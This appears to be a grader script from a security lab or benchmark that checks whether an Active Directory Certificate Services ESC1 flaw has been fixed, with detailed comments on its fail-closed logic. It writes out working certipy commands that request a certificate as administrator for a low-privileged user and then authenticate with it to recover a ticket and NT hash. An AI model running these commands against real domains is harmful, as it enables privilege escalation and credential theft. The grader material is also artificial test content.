#!/usr/bin/env bash
# meta4/ad-vm/scenario-07/verify-poc.sh
# PASS (exit 0) iff alice cannot coerce an Administrator PFX via ESC1.
#
# FAILS CLOSED. The previous version treated "no PFX was produced" as
# "PoC blocked" and exited 0. Because /usr/bin/certipy-ad did not exist on the
# attacker -- the provisioner symlinked pip names that pip never creates, into
# a directory the scenarios never call -- that branch fired on every run, and
# this scenario reported PASS on an unmodified, fully vulnerable box.
#
# Rules now:
#   * A missing or broken tool is a hard error (exit 2), never a pass.
#   * Only an EXPLICIT enrollment denial counts as blocked.
#   * Anything unrecognised fails, because an inconclusive probe is not
#     evidence that the host was repaired.

set -uo pipefail

CERTIPY=/usr/bin/certipy-ad
DC_IP=10.20.30.5
CA_HOST='corp-ca01.corp.local'
CA_NAME='corp-ca01-CA'
TEMPLATE='ESC1-SmartCard'

# --- tool preflight: a missing grader dependency must never look like a pass ---
if [ ! -x "$CERTIPY" ]; then
    echo "[verify-poc-07] HARNESS ERROR: $CERTIPY missing or not executable" >&2
    exit 2
fi
if ! "$CERTIPY" --help >/dev/null 2>&1; then
    echo "[verify-poc-07] HARNESS ERROR: $CERTIPY present but fails to run" >&2
    "$CERTIPY" --help 2>&1 | tail -3 >&2
    exit 2
fi

cd "$(mktemp -d)" || { echo "[verify-poc-07] HARNESS ERROR: mktemp failed" >&2; exit 2; }

# -target is REQUIRED and was missing. Without it certipy sends the RPC
# enrollment request to -dc-ip, i.e. the DOMAIN CONTROLLER, which does not run
# CertSvc -- so its endpoint mapper has no ICertRequestD and every run died with
#   ept_s_not_registered for 91AE6020-9E3C-11CF-8D7C-00AA00C091BE
# on gates 1 AND 2 alike. -dc-ip is for LDAP/Kerberos; the CA host is separate.
#
# This looked for a long time like a CertSvc registration fault on the CA. It
# was not: rpcdump against corp-ca01 lists the interface bound on
# ncacn_ip_tcp:10.20.30.6[49712], and adding -target immediately produced
# "[*] Request ID is 9" -- the CA accepting and processing the request. The
# requests had simply been going to the wrong machine.
#
# stdin is redirected from /dev/null because certipy prompts
# "Would you like to save the private key? (y/N)" on some errors, and a grader
# must never block on input.
REQ=$(timeout 60 "$CERTIPY" req \
    -u 'alice@corp.local' -p 'Password1!' \
    -ca "$CA_NAME" \
    -target "$CA_HOST" \
    -dc-ip "$DC_IP" \
    -template "$TEMPLATE" \
    -upn 'administrator@corp.local' 2>&1 </dev/null)
REQ_RC=$?

echo "--- certipy req output (rc=$REQ_RC) ---"
echo "$REQ"
echo "--- /certipy req ---"

# A timeout is not a repair. 124 is GNU timeout's signal that the command was
# killed; grading that as "blocked" would reward a host that merely became slow
# or unreachable.
if [ "$REQ_RC" -eq 124 ]; then
    echo "[verify-poc-07] enrollment timed out - inconclusive, not a pass" >&2
    exit 1
fi

# --- CA not serving RPC: HARNESS ERROR, never a verdict ---
#
# ept_s_not_registered means the endpoint mapper has no ICertRequestD
# (91AE6020-9E3C-11CF-8D7C-00AA00C091BE) to hand out: the CA's enrollment
# interface is not reachable from here. That says nothing about whether the
# template is still exploitable.
#
# This used to fall through to exit 1, which is wrong in BOTH directions.
# Observed on the 2026-07-26 gate run: gates 1 AND 2 both hit this, so the
# vulnerable baseline "failed for the right reason" and the remediated host
# "was still vulnerable" -- on identical output that only ever meant the CA
# was unreachable. Exit 2 keeps it out of the evidence pool entirely.
#
# Safe to treat as harness error here because the reference remediation for
# this scenario unpublishes a template and asserts the CA is STILL SERVING.
# Taking the CA offline is never the intended fix, so this can never swallow
# a legitimate repair.
if echo "$REQ" | grep -qiE 'ept_s_not_registered|Failed to get DCE RPC connection|Failed to get dynamic TCP endpoint'; then
    echo "[verify-poc-07] HARNESS ERROR: CA RPC enrollment interface not registered" >&2
    echo "[verify-poc-07] the CA is not serving ICertRequestD to this host -- fix the lab, not the scenario" >&2
    exit 2
fi

# --- exploited? ---
if [ -f administrator.pfx ]; then
    AUTH=$(timeout 60 "$CERTIPY" auth -pfx administrator.pfx -dc-ip "$DC_IP" 2>&1)
    echo "--- certipy auth output ---"
    echo "$AUTH"
    if echo "$AUTH" | grep -qE 'NT hash|AS-REP received'; then
        echo "[verify-poc-07] ESC1 still exploitable - PFX + TGT + NT hash recovered" >&2
        exit 1
    fi
    echo "[verify-poc-07] a PFX was issued to alice for administrator@corp.local" >&2
    echo "[verify-poc-07] template still permits UPN takeover even though auth did not complete" >&2
    exit 1
fi

# --- explicitly blocked? ---
#
# CERTSRV_E_TEMPLATE_DENIED (0x80094012) and CERTSRV_E_ENROLL_DENIED
# (0x80094011) were absent and had to be added. They are what the CA answers
# when the vulnerable ENROLMENT RIGHTS are revoked rather than the template
# unpublished -- remediation path 2 in the brief, and what a real defender does
# first. Neither the symbol nor the message matched any existing alternative:
# the detail text is "The permissions on the certificate template do not allow
# the current user to enroll for this type of certificate", which contains
# neither "enrollment ... denied" nor "cannot enroll" nor "access_denied", so
# an ACL-only fix graded as an inconclusive FAIL.
#
# Exact wire strings, from impacket-0.13.1 hresult_errors.ERROR_MESSAGES
# (certipy/lib/errors.py::translate_error_code formats
# "code: 0x%x - <symbol> - <detail>" and certipy/lib/req.py logs it as
# "Got error while requesting certificate: ..."):
#   code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the
#     certificate template do not allow the current user to enroll for this
#     type of certificate.
#   code: 0x80094011 - CERTSRV_E_ENROLL_DENIED - The permissions on this CA do
#     not allow the current user to enroll for certificates.
# Matched on symbol and hex code only, which is tighter than matching prose.
#
# These cannot produce a false pass on an un-remediated host: the injected
# state GRANTS Domain Users the Certificate-Enrollment right, so a permissions
# denial can only be observed after somebody removed it.
if echo "$REQ" | grep -qiE 'template.*not found|access_denied|enrollment.*denied|cannot enroll|does not exist|CERTSRV_E_UNSUPPORTED_CERT_TYPE|0x80094800|not supported by this CA|CERTSRV_E_TEMPLATE_DENIED|0x80094012|CERTSRV_E_ENROLL_DENIED|0x80094011'; then
    echo "[verify-poc-07] alice denied ESC1 enrollment - PoC BLOCKED"
    exit 0
fi

# --- anything else fails closed ---
#
# A CERTIFICATE ISSUED TO ALICE LANDS HERE, AND THAT IS DELIBERATE.
#
# Clearing ENROLLEE_SUPPLIES_SUBJECT does not make the CA refuse the request;
# it makes the CA disregard the supplied SAN and build the subject from the
# requester's own directory identity. The request still succeeds and certipy
# still writes a PFX -- named alice.pfx, because the filename is derived from
# the identity in the ISSUED certificate (certipy/lib/req.py::
# _determine_output_filename), falling back to the requesting username when the
# certificate carries no SAN at all. No denial string is produced, so that
# state reaches this branch and grades FAIL.
#
# scenario-10 has a PASS branch for the equivalent state and this scenario
# deliberately does NOT. There the finding is a CA-wide EDITF flag and the
# template involved is the built-in User template, so a cert bound to the
# requester means the whole finding is closed. Here the seeded object IS the
# template: after clearing the name flag it remains published and enrollable by
# any domain user, one attribute change from exploitable again, so the
# coercion being refused today is a partial mitigation and not a closure.
# threat.md's "Acceptance criterion" states this and remediation path 3 says
# it explicitly. Do not port scenario-10's branch here without changing both.
echo "[verify-poc-07] no PFX and no recognised denial - INCONCLUSIVE, grading FAIL" >&2
echo "[verify-poc-07] an inconclusive probe is not evidence of remediation" >&2
exit 1
